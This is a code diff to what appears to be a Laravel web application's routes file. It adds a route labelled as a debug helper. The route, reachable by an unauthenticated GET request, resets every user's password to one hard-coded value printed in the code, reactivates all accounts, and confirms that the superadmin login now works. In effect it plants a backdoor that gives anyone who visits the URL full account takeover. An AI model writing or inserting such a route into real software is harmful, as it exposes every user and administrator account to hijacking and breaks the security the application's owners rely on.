@@ -1295,3 +1295,20 @@ Route::get('/logout', function() {
     request()->session()->regenerateToken();
     return redirect()->route('login');
 })->middleware('auth')->name('logout.get');
+// ============================================================
+// DEBUG: RESET PASSWORD ZOTE KWA Sapta@2025!
+// ============================================================
+Route::get('/debug/reset-all-to-sapta', function() {
+    $hashed = \Hash::make('Sapta@2025!');
+    $updated = \DB::table('users')->update([
+        'password_hash' => $hashed,
+        'account_status' => 'active',
+        'is_first_login' => false,
+    ]);
+    $superadmin = \DB::table('users')->where('username', 'superadmin')->first();
+    return response()->json([
+        'success' => true,
+        'users_updated' => $updated,
+        'superadmin_verify' => \Hash::check('Sapta@2025!', $superadmin->password_hash),
+    ]);
+})->name('debug.reset-all-to-sapta');
